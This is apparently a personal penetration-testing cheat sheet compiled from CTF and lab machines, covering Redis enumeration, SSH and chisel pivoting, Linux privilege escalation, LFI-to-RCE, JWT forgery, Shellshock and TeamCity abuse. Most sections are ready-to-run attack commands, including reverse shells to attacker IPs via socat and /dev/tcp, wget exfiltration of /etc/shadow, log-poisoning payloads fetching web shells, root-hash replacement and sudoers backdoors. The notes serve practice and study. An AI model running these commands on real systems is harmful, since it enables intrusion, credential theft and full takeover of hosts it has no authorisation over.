* * *
NOTES
* * *

### Important stuffs

------------------------------

- [Custom Dork engine](https://vulnpire.github.io/bounty-search-engine/)

-------------------------------

### Enumerating REDIS

- Use `redis-cli -h [ip]` to connect
- Then, `AUTH [password]` to authenticate

![image](https://github.com/user-attachments/assets/caddc1da-a3d1-4df3-b714-f8aec08b49f8)

- Use `KEYS *` to list all the keys

![image](https://github.com/user-attachments/assets/60222e44-a93f-4435-823a-d9ad4e19e9b3)

- Then, user `GET <key>` to read a key of te string type

![image](https://github.com/user-attachments/assets/56e16e94-337b-45fe-9a5c-99536e5332c3)

- Use `lrange <key> <start number> <stop number>` to read a list

![image](https://github.com/user-attachments/assets/0093c647-0df8-489d-8be6-6aaed2094fae)

-----------------------------

### REFERENCES:

- [Redis Cheatsheet](https://redis.io/learn/howtos/quick-start/cheat-sheet)
  
--------------------------------

### **Webhooks**:

- [Request Catcher](https://requestcatcher.com/)
- [Postb.in](https://www.postb.in/)

---------------------------------

### Portforwarding with SSH and proxychains

- Edit the `/etc/proxychains` file and comment `sock4 127.0.0.1 9050` and change sock5's port value to your desired port

- Connect with dynamic portforwarding with ssh

      ssh -l id_rsa -D {proxychains' sock5 port number}

- To scan the internal network with nmap,use

      proxychains nmap -sT 127.0.0.1

- To local port forward

      sudo ssh -l id_rsa -L {port you want to forwrd through}:127.0.0.1:{remote port discovered}
      ssh -N -L {local port(your machine)}:127.0.0.1:{remote port(victim machine)} rosa@chemistry.htb # No verbose output

-------------------------------

### Removing `\r` in `exploitdb` scripts

    sed -i -e 's/\r$//' <script's name>

--------------------------------

### Port Forwarding with chisel

- Set up a server with `chisel server -p <port> --reverse` on the attacker machine
- On the client's machine, use `./chisel client [chisel server's ip]:[chisel's server port} R:[port you want it to tunnel through on the server's machine]:127.0.0.1:[internal port running a service on the victim's machine]`

---------------------------------

### To replace the root hash by generating a new one

- Use `openssl passwd -6 (password)`
- Clear the root hash in `/etc/shadow` and replace it with your hash, notice the highlighted part

  ![image](https://github.com/user-attachments/assets/8270951c-d313-4bf8-9f28-4ac5a58db988)

- Format-:```root:<hash>:18195:0:99999:7:::```
----------------------------------

### Installing adb-tools on Kali Linux[Ubuntu/Debian]

    sudo apt-get install android-sdk-platform-tools


### ADB-Tools

- Use `adb devices` to see devices connected
- Use `adb shell pm path <package name>` to get the apk package name
- Use `adb pull <package name>` to download apk locally

### STATIC ANALYSIS

- Use this grep examples to check for  weak cryptography e.g exposed private key

          grep -r "SecretKeySpec" *
      
          grep -rli "aes" *
      
          grep -rli "iv"

- To check for exported preferences, check the `AndroidManifest.xml` with grep

      cat AndroidManifest.xml | grep "activity" --color ##To check activities
      cat AndroidManifest.xml | grep "android:allowBackup" --color ## To check the app allows backup access
      cat AndroidManifest.xml | grep "android:debuggable" --color ### Check if the app is debuggable,it makes it easier to reverse engineer if debuggable
      cat AndroidManifest.xml | grep "android:" --color #finding android permissions

- Apps permission
  Apps can be `normal` or `dangerous`, normal perms don't pose risks or dangers if granted but `dangerous` ones pose otherwise

- Discovering Firebase Scanner

  `git clone https://github.com/shivsahni/FireBaseScanner`
  
  - Commands

     `python FireBaseScanner.py -p /path/apk`

--------------------------

### POP3 login

- Use

      telnet <ip> <port>
      USER <username>
      PASS <password>
  
-------------------------- 

### Content-Security-Policy 
- Content-Security-Policy prevents execution of inline javascript code and sets a trusted list of stylesheets,scripts and plugin to be allowed by the browser.
     - Examples of inline javascript

           <script>alert("5");</script>
      
- Use the http header `Content-Security-Policy` to dictate the security policy of the content.

-Essence of the header include
   - Prevents execution of inline scripts
   - Provides a list of a safe external domains for the browser to load scripts

### Directives used by the Content-Security-Policy header

Policy: `Content-Security-Policy: script-src 'self' https://safe-external-site.com; style-src 'self'`

- `Script-src`: It tells the browser where to load scripts from, `self` indicates that scripts should be loaded from the same domain or loaded from domain `https://safe-external-site.com`
- The `style-src` directs the browser to load from the same domain and not an external one.

- You can also create a CSP directive within a `<meta>` tag e.g

  `<meta http-equiv="Content-Security-Policy" content="script-src 'self' https://safe-external-site.com">`

- `unsafe-inline` directives defeats the purpose of CSP and allows execution of inline scripts which is not highly recommended.(Smells like XSS)
- default-src: Defines the default policy for fetching all resources. Whenever a more specific policy is absent, the browser will fallback to the default-src policy directive. Example: default-src 'self' trusted-domain.com
- img-src: Defines valid sources for images, e.g. img-src 'self' img.mydomain.com
- Font-src: Defines valid sources for font resources.
- object-src: Defines valid sources for plugins and external content, like <object> or <embed> elements.
- Media-src: Defines valid sources for audio and video

### Sources allowed
    
    'none' : Match nothing.
    'self': Match the current host domain (same origin, i.e. host and port). Do not match subdomains, though.
    'unsafe-inline': Allow inline JavaScript and CSS.
    'unsafe-eval': Allow dynamic text to JavaScript evaluations.
    domain.example.com: Allow loading resource from the specified domain. To match any subdomain, use the * wildcard, e.g. *.example.com
    https: or ws:: Allow loading resources only over HTTPS or WebSocket.
    nonce-{token}: Allow an inline script or CSS containing the same nonce attribute value.
  
   
### Explaining Nonce

- `Nonce` attribute allows us to use specific inline attributes without the need to enable the `unsafe-inline` attributes.It is an attribute of the `<script>` and `<style>` tag.

### How does it work

- For every request, the server creates a base64 encoded value that cannot be guessed.Then, the server includes it in every allowed inline tag allowed. e.g

  <script nonce="dGhpcyBpcyBhIG5v==">alert("5")</script>

- The nonce is also indicated in the inline `<style>` and `<script>` tag allowed e.g

      Content-Security-Policy: script-src 'nonce-dGhpcyBpcyBhIG5v=='; style-src 'nonce-dGhpcyBpcyBhIG5v=='

--------------------

References:

--------------------

- CSP: [AKSHAY](https://www.writesoftwarewell.com/content-security-policy/)

--------------------

### ABUSING NPM INSTALL node package-lock.json to get shell access

- Change file's details  to
  
              {
              "name": ".nodeitems",
              "scripts": {
                      "preinstall": "[shell code]"
               }
            }

--------------------

### TERMUX: Adding tmux to your ~/.zlogin to prevent errors

      if [-z "$TMUX"]; then
      exec tmux
      fi
- Explanation: $TMUX vsriable prevents nested tmux instances are started on login shells. `exec` will replace current process with a new one i.e. current shell will be terminated and tmux instance with shell inside will be started, so you won't need to exit twice.

-------------------

### Adding tmux to your custom zsh shell

- Add tmux plugin to your plugins

      plugins(tmux)

- Set `ZSH_TMUX_AUTOSTART=true` in your `.zshrc`
- Note that you have to add this assignment before the line

      source $ZSH/oh-my-zsh.sh

-------------------

### 0XTIberius's sql payload

- [OxTiberius'slist](https://tib3rius.com/sqli.html)

-------------------

### Using /usr/bin/script to spawn shell

      /usr/bin/script -qc /bin/bash /dev/null
      ctrl + z
      stty raw -echo; fg; reset

---------------------

### Spawning shell with socat

- Attack Machine
  
      socat file:`tty`,raw,echo=0 tcp-listen:[port]

- Victim machine

      wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[ip]:[port]

-----------------------

### Privesc with PATH HIJACKING

- If the path to a binary is not specified in a script or binary e.g `tar instead of /usr/bin/tar`, you can set the environmental variable with `export PATH=.:$PATH` to check the current directory for our malcious binary before moving to `/usr/bin` to grab a binary.

- Our Malicious tar file should contain this if python3 is present on the victim machine

      #! /usr/bin/env python3 
      print("Malicious me")
      import os
      os.setuid(0)
      os.setgid(0)
      os.system("/bin/bash")

- Python
      
      #! /usr/bin/env python
      print("Malicious me")
      import os
      os.setuid(0)
      os.setgid(0)
      os.system("/bin/bash")

- Use `chmod +x tar` later


### REFERENCES:

- [Nguyen](https://securitynguyen.com/posts/linux-privilege-escalation/path-hijacking-linux-privilege-escalation/)

---------------------------

### Exploiting right to modify ssh motd(message of the day) in `/etc/update-motd.d`

- Write the sh code to 00-header, the code grants suid bit to the bash file copied to a user's directory, `<username>` represents the user you have access to

      echo "cp /bin/bash /home/<username>/bash && chmod u+s /home/<username>/bash" >> /etc/update-motd.d/00-header

- Exit the ssh connection and reconnect, then run

      ./bash -p


### REFERENCES
   
- [HDKS](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/update-motd-privilege-escalation/)

----------------------------------------

### Interesting way to access root

- Add your user to the `/etc/sudoers` file and grant power to execute all commands

      echo "<user> ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers

------------------------------

### Abusing docker.sock unix socket

- If a docker container contains a `docker.sock` file,you can find it with `find / -name docker.sock 2</dev/null`

![image](https://github.com/user-attachments/assets/5bf2e2ef-f333-426b-9dbe-eb414b88e1d6)

- Make it accessible on the machine with socat

      socat TCP-LISTEN:[PORT],reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock

   ### Getting a revshell as root on the container

   - List all containers to get their ids

          curl http://localhost:[port]/containers/json

   - Add the id to this link, replace cmd's value with your rev shell code

         curl http://localhost:8080/containers/[existing container's id]/exec -X POST -H  "Content-Type: application/json" -d '{"AttachStdin":false, "AttachStdout":true, "AttachStderr":true, "Tty":false, "Privileged":false, "Cmd":["socat","TCP:[ip]:[port]","EXEC:bash"]}'

  - Start the container with id from the output the command above

        curl http://localhost:8080/exec/<id>/start -X POST -H "Content-Type: application/json"  -d '{"Detach": false,"Tty": false}'

- Mounting host partition on docker

      mkdir /tmp/mnt
      mount /dev/<partition> /tmp/mnt
      chroot /tmp/mnt
      mount -t proc proc /proc # Mount /proc to allow access to hardware information and running processes

--------------------

### References:

- [Quarkslab](https://blog.quarkslab.com/why-is-exposing-the-docker-socket-a-really-bad-idea.html)
- [Dejandayoff](https://dejandayoff.com/the-danger-of-exposing-docker.sock/)

----------------------

### Privesc with doas 

- Doas allows execution of commands as another user
- Find `doas.conf` with

      find / -name "doas.conf" -type f 2</dev/null

![image](https://github.com/user-attachments/assets/cfc414f8-1003-4122-a731-66f8f096f89b)

- To execute commands,use

       doas -u <user> <command> <args>
       e.g doas -u root rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null

--------------------------

### Exploiting GIT to gain sensitive information


### REFERENCES

- [Some OP medium blog](https://satyasai1460.medium.com/how-git-folder-can-be-exploited-to-access-sensitive-data-eb805c38fd6c)

----------------------------

### PRIVESC with /usr/bin/wget

![image](https://github.com/user-attachments/assets/592ffb4a-8c02-479f-b0be-6bc6b131435d)

- File read,set up a listener with nc on your attack machine to receive
- Send file with

      sudo -u root /usr/bin/wget post-file=/etc/shadow <ip>:<port>

- To receive file

      sudo -u root /usr/bin/wget http://<ip>:<port>/filename -O <save name>

### REFERENCES

- [HDKS](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/)

----------------------------

### LFI2RCE with apache2 server's log

- Log location-:`/var/log/apache2/access.log`
- Host a command shell php code with python's http.server

  ![image](https://github.com/user-attachments/assets/e2e7c58f-4e52-44bc-aaa5-1c3f2cec9e49)

- RCE:
  - Exploit HTTP-Header `User-Agent`
    e.g

         curl http://mafialive.thm/test.php\?view\=/var/www/html/development_testing/.././.././.././.././var/log/apache2/access.log -H "User-Agent: <?php file_put_contents('shell.php',file_get_contents('http://<http server's ip>:<http server'sport>/shell.php')) ?>"
  - Reload the log file to execute code
  - Sometimes you need to set the file path of shell.php to a path with write permissions

 ----------------------------
 
 ### REFERNCES:

 - [Roquenight](https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet)
   
---------------------------------

### Abusing suid flask

- Sudoers rule

![image](https://github.com/user-attachments/assets/5402e95f-60ca-4b2d-a2b3-a5d200399287)
 
- Poc code
  
            import os
            from flask import Flask,render_template_string
            
            app = Flask(__name__)
            os.setuid(0)
            os.setgid(0)
            os.system("bash -p")
            
            @app.route("/")
            def index():
                return render_template_string("Life tuff ooo!!!!")
            
            if __name__ == "__main__":
               app.run(port=8080,debug=True)

- Set the environmetal variables

      export FLASK_APP=app.py
      export FLASK_ENV=development

- Run
       sudo -u root /usr/bin/flask run

- Root

![image](https://github.com/user-attachments/assets/34e3c7a7-03b6-4b1b-b857-bdb93143c5e9)

---------------------------

### Executing Shell Commands with Haskell code

- Save as run.hs

      import System.Process
      
      main = callCommand "bash -c 'bash -i 5<> /dev/tcp/10.8.158.229/1337 0<&5 1>&5 2>&5'"

---------------------------

### REFERENCES:

- [Stack Overflow](https://stackoverflow.com/questions/3470955/executing-a-system-command-in-haskell)

---------------------------

### LFI2RCE with php://filter/

- Characters can be injected via php://temp/ filter
- Generate php code with this [script](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)
  
- Example of `<?=`$_GET[0]`;;?>` as generated by the author

        php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp

- To execute webshell e.g

      http://127.0.0.1/?0=id&file=[filter generated above]

- Sweet RCE[Test on Inclusiveness PG PLAY]
- Script usage for the php filter

      ./filter.py --rawbase64 [base64 encoded php code]

![image](https://github.com/user-attachments/assets/340321c8-e317-4ffa-bd7f-920ae50f57d8)

- Rce

![image](https://github.com/user-attachments/assets/d06ea870-87ae-4115-9b2c-c904ebc511cc)

- It should be noted that if you can read a valid file that is being rendered,you should tweak the script's variable to the file you can read.File `php://temp` is not compulsory,this approach is crucial in a case where a filename is required as a filter.

![image](https://github.com/user-attachments/assets/d5bfe1f8-1e22-4163-85bc-82ed2b73e335)

- Exploiting with valid `/etc/passwd` file

![image](https://github.com/user-attachments/assets/75d87504-5d1d-43ad-9c91-ad76c853a86c)



--------------------------------

### REFERENCES:

- [SundaeGan](https://medium.com/@sundaeGAN/php-wrapper-and-lfi2rce-81c536ef7a06)
- [Script's Link](https://github.com/SENSEiXENUS/senseixenus.github.io/blob/main/posts/Notes/scripts/phpfilter.py)

---------------------------------

### Abusing group `lxd`

- If a user is part of the user `lxd`,we can create a vulnerable container and breakout as root

![image](https://github.com/user-attachments/assets/b84714a0-20dd-440d-a8f1-40e13d8f7bb4)

- Initialize lxd with `lxd init` and add this settings

![image](https://github.com/user-attachments/assets/28d07b8e-944c-4889-9872-6f15b4ff94cf)

- Create this a container in your machine and build with root

      git clone https://github.com/saghul/lxd-alpine-builder.git
      cd lxd-alpine-builder
      ./build-alpine

- Transfer it to the victim machine,receive in the user's home directory

- Import with

      lxc image import [tar file] --alias alpine
      lxc image list #To list images

![image](https://github.com/user-attachments/assets/1fe4327a-67ca-4ef9-9e1f-0b0f634abb78)

- The next step is to run a privileged container, so it runs as root

      lxc init alpine juggernaut -c security.privileged=true
      lxc config device add juggernaut gimmeroot disk source=/ path=/mnt/root recursive=true
      lxc start juggernaut
      lxc list

![image](https://github.com/user-attachments/assets/d3ebab8c-5738-4817-8c9b-5a4bbcadce18)

- Then execute juggernaut

      lxc exec juggernaut sh

- Use `chroot /mnt/root` to change root filesystem since we've mounted it

![image](https://github.com/user-attachments/assets/f7c9426f-b04c-4539-bce9-2afa182b4ec8)

- Then,you can replace the root hash in `/etc/shadow` and login as root

---------------------

### REFERENCES

- [Juggernaut Sec](https://juggernaut-sec.com/lxd-container/)

----------------------

### Attacking JWTs [JSON Web Token]

- It is a standardized format of cryptographically signed json data between systems.It is used for authentication, session handling and access control mechanisms.

### JWT formats

- It consist of 3 headers,which includes `header`,`payload` and `signature`.The header consists of metadata of a token, the payload contains the user details or claim.It should be noted that this headers are base64 encoded e.g

- Typical Jwt:

      eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA
  
- Header-:

      eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9

- Payload-:

        eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ

- Base64 decoded value of the payload-:

        {"iss":"portswigger","exp":1648037164,"name":"Carlos Montoya","sub":"carlos","role":"blog_author","email":"carlos@carlos-montoya.net","iat":1516239022fQ

- The signature is generated by hashing the header and payload. In order to generate the token, a secret signing key is required, the server hashes the header and payload with the secret key to generate the jwt.The signing key is required to generate the correct signature of header and payload.

### JWT vs JWS vs JWE

- JSON Web Token is not used without Json Web Signature and JSON Web Encryption, When people use the term `JWT` , it also means a JWS token. JWEs are very similar except the actual contents are encrypted and not encoded.


### Vulnerabilities

### FLAWED SIGNATURES VERIFICATION

- Servers don't usually store any information about the JWTs that they issue. Instead, each token is an entirely self-contained entity. This has several advantages, but also introduces a fundamental problem - the server doesn't actually know anything about the original contents of the token, or even what the original signature was. Therefore, if the server doesn't verify the signature properly, there's nothing to stop an attacker from making arbitrary changes to the rest of the token

- Jwt libraries provide a way for verifying and decoding them, e.g the Node.js library `jsonwebtoken` has methods `verify()` and `decode()`. Occassionally, developers confuse this two methods and pass the token to `decode()` which doe not verify the signature.With this flaw, we can sign cookies for other users.


### Accepting JWTS with no signature

- The jwt token has an `alg` headers which states the algorithmn technique used to sign the token.Although, some servers allow the `none` which is flawed and unsigned with the secret key.Due to the obvious dangers of this, servers usually reject tokens with no signature. However, as this kind of filtering relies on string parsing, you can sometimes bypass these filters using classic obfuscation techniques, such as mixed capitalization and unexpected encodings.Even if the token is unsigned, the payload part must still be terminated with a trailing dot.

- A tampered one, this should be the structure, set the header's alg to not and tweak the payload's user but it must end wit a trailing dot.

          eyJraWQiOiJiODU0Yjg0Mi0wMzM5LTQ0ZGEtYjM4Zi05ODQ2ODRiOTE1MDYiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcyNTU2OTk3Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.

Decoded header||payload-:```{"kid":"b854b842-0339-44da-b38f-984684b91506","alg":"none}||{"iss":"portswigger","exp":1725569977,"sub":"administrator"}```

### JWT SECRET KEY BRUTE FORCE

- Some signing algorithms, such as HS256 (HMAC + SHA-256), use an arbitrary, standalone string as the secret key. Just like a password, it's crucial that this secret can't be easily guessed or brute-forced by an attacker. Otherwise, they may be able to create JWTs with any header and payload values they like, then use the key to re-sign the token with a valid signature.

- Bruteforce with hashcat with
  
      hashcat -a 0 -m 16500 <jwt> <wordlist>

- Use `hashcat --show <jwt>` to see a the secret

  ![image](https://github.com/user-attachments/assets/47c684e4-b0a3-4f81-a514-843a00279d6e)

### JWT PARAMETER Headers Injection

 According to the JWS specification, only the alg header parameter is mandatory. In practice, however, JWT headers (also known as JOSE headers) often contain several other parameters. The following ones are of particular interest to attackers.

    jwk (JSON Web Key) - Provides an embedded JSON object representing the key.

    jku (JSON Web Key Set URL) - Provides a URL from which servers can fetch a set of keys containing the correct key.

    kid (Key ID) - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. Depending on the format of the key, this may have a matching kid parameter.

- As you can see, these user-controllable parameters each tell the recipient server which key to use when verifying the signature. 


### Injecting self-signed JWTs via the jwk parameter

- The JSON Web Signature (JWS) specification describes an optional jwk header parameter, which servers can use to embed their public key directly within the token itself in JWK format
- Example:
      
        {
          "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
          "typ": "JWT",
          "alg": "RS256",
          "jwk": {
              "kty": "RSA",
              "e": "AQAB",
              "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
              "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
          }
      }
- Ideally, servers should only use a limited whitelist of public keys to verify JWT signatures. However, misconfigured servers sometimes use any key that's embedded in the jwk parameter.

### Exploiting with JWT_EDITOR

- Generate a new RSA key with JWT Editor

![image](https://github.com/user-attachments/assets/7100ee8e-5bf1-4a12-aad0-00db0cf5ba0c)

- Intercept a request with burp suite proxy and send to the repeater

![image](https://github.com/user-attachments/assets/1695cdf0-1017-4b1d-8e1d-a318029ec6cb)

- Rightclick and  pick `copy public key as JWK` in the JWT_Editor tab
- Go to the json web token tab in the repeater to tweak the token

![image](https://github.com/user-attachments/assets/00420fc6-887f-4a99-b3fa-2d38c97566e4)

- Create an key `jwt` to hold the public key object

![image](https://github.com/user-attachments/assets/08b5da20-da59-48b7-8726-55fdad16b3a6)

- Then, add the replace the `kid` key with the new public key `kid`.

![image](https://github.com/user-attachments/assets/6797f61a-66c9-494e-8cc8-a5210743ac28)

- Click on attack and `embedded jwt` later

![image](https://github.com/user-attachments/assets/1f2aa050-eb51-4da0-8e01-5d07bcea496f)

- Admin access

![image](https://github.com/user-attachments/assets/c169a215-3e76-43db-bb2e-2578492454f2)

### Injecting self signed JWTs via the url endpoint

- Instead of embedding private keys with the `jwk` ,some servers allow you use `jku` (JWK set url) to reference a set containing the key.A jwk key is a json object containing array representing different keys.e.g

      {
          "keys": [
              {
                  "kty": "RSA",
                  "e": "AQAB",
                  "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
                  "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
              },
              {
                  "kty": "RSA",
                  "e": "AQAB",
                  "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
                  "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
              }
          ]
      }


-  JWK Sets like this are sometimes exposed publicly via a standard endpoint, such as `/.well-known/jwks.json`.More secure websites will only fetch keys from trusted domains, but you can sometimes take advantage of URL parsing discrepancies to bypass this kind of filtering.[Sliding to SSRF to learn some stuffs]

---------------------------

### Compiling exploit error: no cc1 in directory

![image](https://github.com/user-attachments/assets/c6adac8b-c767-4656-a1b1-3b7f9f1eb75a)

- It happens if `/usr/bin` is not added to the PATH environmental variable

  ![image](https://github.com/user-attachments/assets/17b40813-87eb-48e9-9cc7-f27f871a0125)

- Add it to the path with

      export PATH=/usr/bin:$PATH

![image](https://github.com/user-attachments/assets/60592489-d0dd-41a7-a944-022247589547)

--------------------------

### Exploiting Shellshock

- Inject payload in `User-Agent` header

      curl -i -H "User-agent: () { :;}; echo; [command]" [host]/[cgi_script]

- The binary path should be detailed to execute shell commands e.g `/bin/ls` or `/bin/cat`

![image](https://github.com/user-attachments/assets/7542f360-aeb5-4355-a2ea-cc30d3644928)


--------------------

### REFERENCES:

- [Shellshock in cgi scripts](https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock)

--------------------

### READING FILES WITH ECHO

- Use

      echo "$(<[filename])"

---------------------

### PENTESTING TEAM CITY

- Grep for super token with ` grep -rni 'authentication token' TeamCity/logs 2</dev/null`

![image](https://github.com/user-attachments/assets/861f4f8e-43de-4b16-8ea2-92ffa727aaa3)

### Exploit with this steps

- Create a new project, pick "manually"

![image](https://github.com/user-attachments/assets/e0a9ec77-75e0-4dce-96f0-010b60570c8a)

- Create a build configuration

![image](https://github.com/user-attachments/assets/86bf10a6-27d2-4552-852a-5d0c604b4094)

- Click on build steps

![image](https://github.com/user-attachments/assets/57a9b4d2-6687-4eea-be50-6c77b5c97ce8)

- Then, add a build step, set the runner type to `command line` and copy any bash reverse shell code and save

![image](https://github.com/user-attachments/assets/09f05185-e513-4543-984c-68bfdbb22b09)

- Click on run to spawn a reverse shell as root

![image](https://github.com/user-attachments/assets/230358c8-5466-465e-a4cc-af12c31320e0)

- Reverse shell as root

![image](https://github.com/user-attachments/assets/32893314-b416-4008-9a94-fa6d8c90a3b0)

------------------------------

### REFERENCES:

